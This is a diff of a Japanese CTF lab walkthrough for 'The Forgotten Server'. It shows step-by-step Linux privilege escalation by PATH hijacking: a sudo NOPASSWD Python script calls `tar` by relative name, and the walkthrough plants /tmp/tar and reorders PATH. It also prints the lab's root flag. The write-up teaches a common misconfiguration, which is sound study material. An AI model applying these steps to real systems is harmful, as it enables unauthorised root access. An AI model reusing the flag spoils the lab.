@@ -1,329 +1,340 @@
 # The Forgotten Server — Walkthrough
 
-> ⚠️ **ネタバレ注意**
->
-> このファイルには `The Forgotten Server` の攻略手順が記載されています。
-> 自力で攻略したい場合は、クリアしてから読んでください。
+> ⚠️ Spoiler / Walkthrough
+> このファイルには本シナリオの攻略手順が含まれています。
 
 ---
 
-## 攻略目標
+## 1. 初期状態の確認
 
-取得するフラグは2つです。
+起動すると `/home/user` から開始する。
 
 ```text
-/home/user/user.txt
-/root/root.txt
+user@lab-server:/home/user$
 ```
 
-最終的な目標はroot権限を取得し、`/root/root.txt`を読むことです。
-
----
-
-# 1. 初期状態の確認
-
-まず、自分がどこにいるのか確認します。
+まず現在地とファイルを確認する。
 
 ```bash
 pwd
-```
-
-続いてホームディレクトリを確認します。
-
-```bash
-ls
-```
-
-いくつかのファイルが見つかります。
-
-特に以下のファイルを確認します。
-
-```bash
-cat README.txt
-cat notes.txt
-```
-
----
-
-# 2. ユーザー情報の調査
-
-現在のユーザーを確認します。
-
-```bash
-whoami
-```
-
-```bash
-id
-```
-
-ここでは一般ユーザーとしてログインしていることが分かります。
-
-次にホームディレクトリにある履歴ファイルを確認します。
-
-```bash
 ls -la
 ```
 
-`.bash_history` が見つかったら確認します。
-
-```bash
-cat .bash_history
-```
-
-過去に管理者が実行したコマンドから、サーバー内に存在するメンテナンス用スクリプトについての情報を得られます。
+`ls -la` では `.bash_history` などの隠しファイルも確認できる。
 
 ---
 
-# 3. Webディレクトリの調査
+## 2. ユーザー領域を調査
 
-サーバー内をさらに探索します。
+`notes.txt` を読む。
+
+```bash
+cat notes.txt
+```
+
+以下のような情報が得られる。
+
+```text
+- The web application was backed up regularly.
+- Old backups were moved into the web directory.
+- The maintenance team used a Python script under /opt.
+- Some old configuration files may still contain useful information.
+```
+
+ここから、
+
+* Webディレクトリ
+* 古いバックアップ
+* `/opt` 配下のメンテナンススクリプト
+
+を調査する。
+
+---
+
+## 3. Webディレクトリを調査
 
 ```bash
 cd /var/www/html
 ls
 ```
 
-Webアプリケーションのファイルが存在します。
-
-```bash
-cat index.html
-```
-
-さらにディレクトリを調査します。
-
-```bash
-ls -la
-```
-
-`backup` ディレクトリを発見できます。
+`backup` ディレクトリを発見する。
 
 ```bash
 cd backup
 ls
 ```
 
+以下のファイルが存在する。
+
+```text
+config.bak
+README.old
+```
+
 ---
 
-# 4. バックアップファイルの確認
-
-バックアップ関連のファイルを調べます。
+## 4. 古い設定ファイルを確認
 
 ```bash
 cat config.bak
 ```
 
-ここには過去のWebアプリケーションで使用されていた設定情報が残されています。
+設定ファイルから以下の情報を発見できる。
 
-また、古いREADMEも確認します。
-
-```bash
-cat README.old
+```text
+BACKUP_ENABLED=true
+BACKUP_SCRIPT=/opt/maintenance/backup.py
 ```
 
-これらの情報から、サーバー上で定期的にバックアップ処理が実行されていることが分かります。
+重要なのは、
+
+```text
+/opt/maintenance/backup.py
+```
+
+というメンテナンススクリプトの存在。
 
 ---
 
-# 5. メンテナンススクリプトの発見
-
-次に、`/opt` 以下を調査します。
+## 5. メンテナンススクリプトを確認
 
 ```bash
-cd /opt
+cd /opt/maintenance
 ls
 ```
 
-`maintenance` ディレクトリを発見します。
-
-```bash
-cd maintenance
-ls
-```
-
-ここに以下のファイルがあります。
-
-```text
-backup.py
-README.txt
-```
-
-READMEを確認します。
-
-```bash
-cat README.txt
-```
-
-続いてPythonスクリプトを確認します。
+`backup.py` を発見する。
 
 ```bash
 cat backup.py
 ```
 
-重要なのは以下の部分です。
+内容：
 
 ```python
+#!/usr/bin/env python3
+
+import os
+
+BACKUP_DIR = "/var/backups"
+
+print("[*] Starting backup...")
+
 os.system(
     "tar -czf /var/backups/site.tar.gz /var/www/html"
 )
+
+print("[+] Backup complete.")
 ```
 
-ここで`tar`が絶対パスではなく、コマンド名だけで指定されています。
+ここで重要なのは、
 
-つまり、実行時の`PATH`によって呼び出されるプログラムを制御できる可能性があります。
+```python
+os.system("tar ...")
+```
+
+となっており、`tar` が絶対パスで指定されていないこと。
+
+つまり、`tar` は `PATH` を検索して実行される。
 
 ---
 
-# 6. sudo権限の確認
-
-現在のユーザーが何を`sudo`で実行できるか確認します。
+## 6. sudo権限を確認
 
 ```bash
 sudo -l
 ```
 
-すると、以下のような設定が見つかります。
+以下が表示される。
 
 ```text
-User user may run the following commands:
+User user may run the following commands on lab-server:
     (root) NOPASSWD: /opt/maintenance/backup.py
 ```
 
-つまり、パスワードなしでroot権限として`backup.py`を実行できます。
+一般ユーザーである `user` が、
 
-ここで重要なのは、
+```text
+/opt/maintenance/backup.py
+```
+
+をroot権限でパスワードなしに実行できる。
+
+ここで、
 
 ```text
 sudo
- ↓
-/opt/maintenance/backup.py
- ↓
-os.system()
- ↓
-tar
++
+PATHから呼び出されるtar
 ```
 
-という実行経路です。
+という組み合わせに注目する。
 
 ---
 
-# 7. PATH Hijacking
+## 7. tarの現在位置を確認
 
-`backup.py`では、
-
-```python
-tar
+```bash
+which tar
 ```
 
-を絶対パスで指定していません。
-
-通常なら、
+通常は、
 
 ```text
 /usr/bin/tar
 ```
 
-などの正規プログラムが実行されます。
+と表示される。
 
-しかし、`PATH`の先頭に自分が作成したプログラムを置くことができれば、
-
-```text
-/tmp/tar
-```
-
-を先に実行させることができます。
-
-概念的には、
-
-```text
-PATH=/tmp:/usr/bin:/bin
-```
-
-とすることで、
-
-```text
-/tmp/tar
-```
-
-→ `/usr/bin/tar`
-
-の順番で検索される状態を作ります。
+つまり現在は `/usr/bin/tar` が使用される。
 
 ---
 
-# 8. 偽のtarを作成
+## 8. PATH Hijackingを考える
 
-まず`/tmp`へ移動します。
+`backup.py` は、
+
+```python
+os.system("tar ...")
+```
+
+としている。
+
+`/usr/bin/tar` のような絶対パスではないため、PATHの検索順序を変更すれば、別の `tar` を先に見つけさせられる。
+
+そこで `/tmp/tar` を作成する。
+
+---
+
+## 9. 偽のtarを作成
 
 ```bash
 cd /tmp
+touch /tmp/tar
 ```
 
-そして`tar`という名前の実行ファイルを用意します。
+成功すると、
 
-```bash
-touch tar
+```text
+[+] Created /tmp/tar
+[*] The file is not executable yet.
 ```
 
-実行権限を付与します。
+と表示される。
 
-```bash
-chmod +x tar
-```
-
-CTFシミュレーターでは、この操作によって悪意のある`tar`を作成した状態として扱われます。
+作成した `/tmp/tar` はユーザー所有のファイルなので、自分で実行権限を付与できる。
 
 ---
 
-# 9. PATHを変更
+## 10. 実行権限を付与
 
-次にPATHを変更します。
+```bash
+chmod +x /tmp/tar
+```
+
+```text
+Mode of '/tmp/tar' changed to 755
+```
+
+となれば成功。
+
+確認する場合：
+
+```bash
+ls -la
+```
+
+---
+
+## 11. PATHを変更
 
 ```bash
 export PATH=/tmp:/usr/bin:/bin
 ```
 
-これで`tar`を実行すると、まず`/tmp/tar`が検索される状態になります。
+ここで重要なのは順番。
 
-現在のPATHを確認します。
-
-```bash
-echo $PATH
+```text
+/tmp
+/usr/bin
+/bin
 ```
 
-また、`which tar`などで実行対象を確認できます。
+の順番になっている。
+
+`PATH` は左から順番に検索されるため、
+
+```text
+/tmp/tar
+```
+
+が
+
+```text
+/usr/bin/tar
+```
+
+より先に見つかる。
 
 ---
 
-# 10. バックアップスクリプトをrootとして実行
+## 12. tarの解決先を確認
 
-準備が完了したら、先ほど確認したスクリプトをsudoで実行します。
+```bash
+which tar
+```
+
+ここで、
+
+```text
+/tmp/tar
+```
+
+と表示されればPATH Hijackingの準備が完了。
+
+もし、
+
+```text
+/usr/bin/tar
+```
+
+と表示される場合は、PATHの順番を確認する。
+
+---
+
+## 13. 脆弱なバックアップスクリプトをsudoで実行
 
 ```bash
 sudo /opt/maintenance/backup.py
 ```
 
-バックアップ処理がroot権限で実行されます。
+成功すると、
 
-このとき、`backup.py`から呼び出された`tar`はPATHの影響を受けます。
+```text
+[*] Starting backup...
+[*] Executing tar from PATH...
+[+] /tmp/tar was executed.
+[+] Privilege escalation successful!
+```
 
-その結果、シミュレーター上で権限昇格が成立します。
+と表示される。
+
+これによりroot権限を獲得する。
 
 ---
 
-# 11. root権限を確認
-
-権限を確認します。
+## 14. root権限を確認
 
 ```bash
 whoami
 ```
 
+結果：
+
 ```text
 root
 ```
-
-となれば成功です。
 
 さらに、
 
@@ -331,19 +342,32 @@ root
 id
 ```
 
-でroot権限を確認できます。
+を実行すると、
+
+```text
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+となる。
 
 ---
 
-# 12. Root Flag
+## 15. root.txtを取得
 
-最後にrootフラグを取得します。
+rootになったので `/root` にアクセスできる。
 
 ```bash
-cat /root/root.txt
+cd /root
+ls -la
 ```
 
-Root Flagが表示されれば完全クリアです。
+`root.txt` を発見する。
+
+```bash
+cat root.txt
+```
+
+Root Flag：
 
 ```text
 FORGOTTEN{root_maintenance_complete_91af}
@@ -351,78 +375,114 @@ FORGOTTEN{root_maintenance_complete_91af}
 
 ---
 
-# 攻略まとめ
-
-今回の攻撃経路をまとめると以下のようになります。
+# 攻略ルートまとめ
 
 ```text
-Linux Enumeration
-        ↓
-Web Directory Discovery
-        ↓
-Backup Configuration
-        ↓
-Maintenance Script
-        ↓
-sudo -l
-        ↓
-backup.py
-        ↓
-os.system("tar ...")
-        ↓
-PATH Hijacking
-        ↓
-Malicious tar
-        ↓
-sudo backup.py
-        ↓
-root
-        ↓
-/root/root.txt
+/home/user
+    │
+    ├── notes.txt
+    │
+    ▼
+/var/www/html/backup
+    │
+    └── config.bak
+          │
+          │ BACKUP_SCRIPT=/opt/maintenance/backup.py
+          ▼
+/opt/maintenance/backup.py
+          │
+          │ os.system("tar ...")
+          ▼
+       sudo -l
+          │
+          │ NOPASSWD
+          ▼
+       which tar
+          │
+          │ /usr/bin/tar
+          ▼
+       /tmp/tar を作成
+          │
+          ▼
+       chmod +x /tmp/tar
+          │
+          ▼
+       PATH=/tmp:/usr/bin:/bin
+          │
+          ▼
+       which tar
+          │
+          │ /tmp/tar
+          ▼
+sudo /opt/maintenance/backup.py
+          │
+          ▼
+        ROOT
+          │
+          ▼
+     /root/root.txt
 ```
 
 ---
 
-# 学べるポイント
+# 脆弱性のポイント
 
-このCTFでは、以下のようなLinuxペネトレーションテストの基本を扱っています。
-
-* ファイルシステムの列挙
-* 隠しファイルの確認
-* バックアップファイルの調査
-* 設定ファイルの調査
-* コマンド履歴の確認
-* メンテナンススクリプトの解析
-* `sudo -l`
-* `sudo`による特権実行
-* `os.system()`の危険性
-* 相対的なコマンド呼び出し
-* `PATH`環境変数
-* PATH Hijacking
-* Linux権限昇格
-
----
-
-## 攻略のポイント
-
-このマシンでは、単純に「怪しいファイル」を探すだけではなく、
-
-> **「root権限で実行されるプログラムが、何を実行しているのか」**
-
-を見ることが重要です。
-
-特に、
+このシナリオの核心は、root権限で実行されるスクリプトが外部コマンドを絶対パスで指定していないこと。
 
 ```python
 os.system("tar ...")
 ```
 
-のような**絶対パスを使用していない外部コマンド実行**は、権限昇格につながる可能性があります。
+このような実装では、実行環境の `PATH` に依存してコマンドが解決される。
 
-CTFでは、`sudo -l`で許可されているプログラムを見つけたら、
+そのため、
 
 ```text
-「このプログラムをrootで実行したら何が起きる？」
+/tmp/tar
 ```
 
-という視点でソースコードを確認することが重要です。
+を作成し、
+
+```text
+PATH=/tmp:/usr/bin:/bin
+```
+
+とすることで、意図した `/usr/bin/tar` ではなくユーザーが用意した `/tmp/tar` を先に解決させる。
+
+これが **PATH Hijacking** である。
+
+---
+
+# Intended Attack Chain
+
+```text
+Information Disclosure
+        ↓
+Old Backup Discovery
+        ↓
+Maintenance Script Discovery
+        ↓
+sudo Misconfiguration
+        ↓
+Unsafe Command Execution
+        ↓
+PATH Hijacking
+        ↓
+Privilege Escalation
+        ↓
+root.txt
+```
+
+このCTFでは、Pythonインタプリタ自体を利用したホストOSへの脱出や、別のroot取得ルートは実装していない。
+
+意図された攻略方法は、
+
+```text
+sudo
+→ backup.py
+→ tar
+→ PATH Hijacking
+→ root
+```
+
+である。
